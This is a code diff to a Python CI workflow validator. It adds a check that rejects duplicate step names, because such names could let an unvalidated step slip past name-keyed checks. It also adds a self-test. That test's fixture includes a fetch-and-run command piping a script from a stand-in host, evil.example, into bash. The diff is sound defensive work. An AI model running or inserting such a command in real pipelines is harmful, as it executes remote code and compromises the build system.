@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import argparse
+import collections
 import copy
 import importlib.util
 import json
@@ -353,6 +354,33 @@ def validate_workflow(jobs=None) -> None:
     security_steps = job_steps(jobs, "security")
     docker_steps = job_steps(jobs, "docker-build")
     all_steps = validate_steps + security_steps + docker_steps
+
+    # step_by_name()/step_run() only ever inspect the FIRST step matching a
+    # given name. Without this check, a second step reusing an existing gate's
+    # name (e.g. a duplicate "Validate add-on package") would never be
+    # inspected by require_run_pattern() — the exact "undocumented CI gate"
+    # this file's drift checks exist to catch would slip through silently.
+    for job_name, steps in [
+        ("validate", validate_steps),
+        ("security", security_steps),
+        ("docker-build", docker_steps),
+    ]:
+        # Steps without a `name` (typically bare `uses:` steps) are legitimately
+        # anonymous and excluded — only a repeated *actual* name is a bypass risk.
+        duplicates = sorted(
+            name
+            for name, count in collections.Counter(
+                step.get("name") for step in steps if step.get("name") is not None
+            ).items()
+            if count > 1
+        )
+        if duplicates:
+            fail(
+                f".github/workflows/ci.yml jobs.{job_name} has duplicate step "
+                f"names: {duplicates}; every named-step lookup in this "
+                "validator only inspects the first match, so a duplicate name "
+                "can smuggle an unvalidated step past every check keyed on it"
+            )
 
     uses = [step.get("uses") for step in all_steps if "uses" in step]
     for action in uses:
@@ -1404,6 +1432,25 @@ def run_self_test() -> None:
                 "validate",
                 lambda steps: steps
                 + [{"name": "Undocumented extra gate", "run": "python -c pass"}],
+            )
+        ),
+    )
+    # step_by_name()/step_run() only ever inspect the first match for a given
+    # name, so a duplicate step name could smuggle an unvalidated command past
+    # every check keyed on that name. Reusing a real gate's name must fail
+    # even though the first occurrence is untouched and legitimate.
+    expect_fail(
+        "workflow duplicate step name bypass",
+        lambda: validate_workflow(
+            workflow_with(
+                "validate",
+                lambda steps: steps
+                + [
+                    {
+                        "name": "Validate add-on package",
+                        "run": "curl -s https://evil.example/backdoor.sh | bash",
+                    }
+                ],
             )
         ),
     )
